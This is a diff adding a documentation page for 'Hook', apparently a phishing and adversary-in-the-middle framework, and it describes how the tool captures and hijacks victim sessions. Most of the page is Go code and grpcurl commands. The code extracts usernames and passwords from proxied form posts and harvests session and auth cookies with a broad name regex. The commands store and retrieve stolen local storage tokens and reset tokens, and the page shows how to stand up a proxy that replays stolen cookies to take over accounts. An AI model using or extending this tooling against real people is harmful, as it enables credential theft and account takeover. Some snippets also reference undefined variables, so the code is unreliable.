@@ -1,0 +1,260 @@
+# Session Capture
+
+Hook captures comprehensive session data during phishing attacks, including credentials, cookies, local storage, URL parameters, and full session hijack capabilities.
+
+## Overview
+
+The Attack Plane stores all captured runtime data:
+- **Sessions** - Victim interaction sessions
+- **Credentials** - Captured usernames and passwords
+- **Cookies** - Authentication and session cookies
+- **Local Storage** - Browser local storage data
+- **URL Parameters** - Query string parameters
+- **Hijacks** - Full session hijack data
+
+## Sessions
+
+Each victim interaction creates a session:
+
+```go
+type Session struct {
+    Id           string
+    Username     string
+    Password     string
+    Custom       map[string]string
+    Params       map[string]string
+    CookieTokens map[string]map[string]*CapturedCookie
+    BodyTokens   map[string]string
+    HttpTokens   map[string]string
+    RemoteAddr   string
+    UserAgent    string
+    IsDone       bool
+    IsAuthUrl    bool
+    CreatedAt    time.Time
+    UpdatedAt    time.Time
+}
+```
+
+### Session Operations
+
+```bash
+# Create session
+grpcurl -d '{
+  "session": {
+    "raid_id": 1,
+    "target_id": 1,
+    "uuid": "abc123",
+    "ip_address": "192.168.1.100",
+    "user_agent": "Mozilla/5.0..."
+  }
+}' helm:61443 hook.atk_svc.AttackPlaneService/NewSession
+
+# Get sessions for raid
+grpcurl -d '{"id": 1}' helm:61443 hook.atk_svc.AttackPlaneService/GetSessionsForRaid
+
+# Get sessions for target
+grpcurl -d '{"id": 1}' helm:61443 hook.atk_svc.AttackPlaneService/GetSessionsForTarget
+```
+
+## Credential Capture
+
+### Automatic Detection
+
+The reverse proxy automatically detects credentials:
+
+```go
+func (s *Session) searchForCredentials(params map[string]string) {
+    for key, value := range params {
+        // Check against username patterns
+        if s.Target.Username.Regex.MatchString(key) {
+            s.Username = value
+        }
+        // Check against password patterns
+        if s.Target.Password.Regex.MatchString(key) {
+            s.Password = value
+        }
+    }
+}
+```
+
+### Credential Storage
+
+```bash
+# Create credential
+grpcurl -d '{
+  "credential": {
+    "session_id": 1,
+    "username": "john.doe@acme.com",
+    "password": "captured_password",
+    "source": "form_post"
+  }
+}' helm:61443 hook.atk_svc.AttackPlaneService/NewCredential
+
+# Get credentials by session
+grpcurl -d '{"id": 1}' helm:61443 hook.atk_svc.AttackPlaneService/GetCredentialsBySessionID
+
+# Get credentials by target
+grpcurl -d '{"id": 1}' helm:61443 hook.atk_svc.AttackPlaneService/GetCredentialsByTargetID
+```
+
+## Cookie Capture
+
+### Automatic Cookie Capture
+
+Session cookies are captured automatically:
+
+```go
+func captureCookies(resp *http.Response, session *Session) {
+    for _, cookie := range resp.Cookies() {
+        // Capture configured cookies
+        if s.Target.Cookies.Regex.MatchString(cookie.Name) {
+            captured := &CapturedCookie{
+                Name:     cookie.Name,
+                Value:    cookie.Value,
+                Domain:   domain,
+                Path:     cookie.Path,
+                HttpOnly: cookie.HttpOnly,
+                Expires:  cookie.Expires,
+            }
+            session.AddCookieToken(domain, cookie.Name, captured)
+        }
+        
+        // Also capture common session cookies
+        commonSessionCookies := regexp.MustCompile(`(?i)(session|sess|sid|token|auth|jwt|access|refresh|id)`)
+        if commonSessionCookies.MatchString(cookie.Name) {
+            session.AddCookieToken(domain, cookie.Name, captured)
+        }
+    }
+}
+```
+
+### Cookie Operations
+
+```bash
+# Create captured cookie
+grpcurl -d '{
+  "cookie": {
+    "session_id": 1,
+    "name": "session_token",
+    "value": "abc123xyz",
+    "domain": "target.com",
+    "path": "/",
+    "secure": true,
+    "http_only": true
+  }
+}' helm:61443 hook.atk_svc.AttackPlaneService/NewCapturedCookie
+
+# Get cookies by session
+grpcurl -d '{"id": 1}' helm:61443 hook.atk_svc.AttackPlaneService/GetCapturedCookiesBySessionID
+
+# Get cookies by target
+grpcurl -d '{"id": 1}' helm:61443 hook.atk_svc.AttackPlaneService/GetCapturedCookiesByTargetID
+```
+
+## Local Storage Capture
+
+Capture browser local storage data:
+
+```bash
+# Create captured local storage
+grpcurl -d '{
+  "item": {
+    "session_id": 1,
+    "key": "auth_token",
+    "value": "eyJhbGciOiJIUzI1NiIs..."
+  }
+}' helm:61443 hook.atk_svc.AttackPlaneService/NewCapturedLocalStorage
+
+# Get local storage by session
+grpcurl -d '{"id": 1}' helm:61443 hook.atk_svc.AttackPlaneService/GetCapturedLocalStorageBySessionID
+```
+
+## URL Parameter Capture
+
+Capture query string parameters:
+
+```bash
+# Create captured URL param
+grpcurl -d '{
+  "param": {
+    "session_id": 1,
+    "key": "token",
+    "value": "reset_token_value"
+  }
+}' helm:61443 hook.atk_svc.AttackPlaneService/NewCapturedURLParam
+
+# Get URL params by session
+grpcurl -d '{"id": 1}' helm:61443 hook.atk_svc.AttackPlaneService/GetCapturedURLParamsBySessionID
+```
+
+## Session Hijacking
+
+### Hijack Process
+
+After capturing authentication data, sessions can be hijacked:
+
+```go
+func (h *Hijacker) HijackSession(s *Session) {
+    port := h.findOpenPort()
+    h.sessions[s.Id] = port
+    
+    // Create proxy with captured session data
+    err := NewProxy(port, "0.0.0.0", s.Target.TargetURL, s.Cookies, s.Headers)
+}
+```
+
+### Hijack Operations
+
+```bash
+# Create hijack record
+grpcurl -d '{
+  "hijack": {
+    "session_id": 1,
+    "target_site": "https://target.com",
+    "proxy_port": 10001
+  }
+}' helm:61443 hook.atk_svc.AttackPlaneService/NewHijack
+
+# Get hijacks by session
+grpcurl -d '{"id": 1}' helm:61443 hook.atk_svc.AttackPlaneService/GetHijacksBySessionID
+```
+
+## Click and Open Tracking
+
+### Clicks
+
+```bash
+# Create click
+grpcurl -d '{
+  "click": {
+    "session_id": 1,
+    "page": "/login",
+    "ip_address": "192.168.1.100"
+  }
+}' helm:61443 hook.atk_svc.AttackPlaneService/NewClick
+
+# Get clicks by session
+grpcurl -d '{"id": 1}' helm:61443 hook.atk_svc.AttackPlaneService/GetClicksBySessionID
+```
+
+### Opens (Email Tracking)
+
+```bash
+# Create open
+grpcurl -d '{
+  "open": {
+    "session_id": 1,
+    "ip_address": "192.168.1.100"
+  }
+}' helm:61443 hook.atk_svc.AttackPlaneService/NewOpen
+
+# Get opens by session
+grpcurl -d '{"id": 1}' helm:61443 hook.atk_svc.AttackPlaneService/GetOpenBySessionID
+```
+
+## Next Steps
+
+- [Raids](/docs/raids) - Campaign management
+- [Target Sites](/docs/target-sites) - Capture configuration
+- [Overview](/docs/overview) - Back to architecture
+
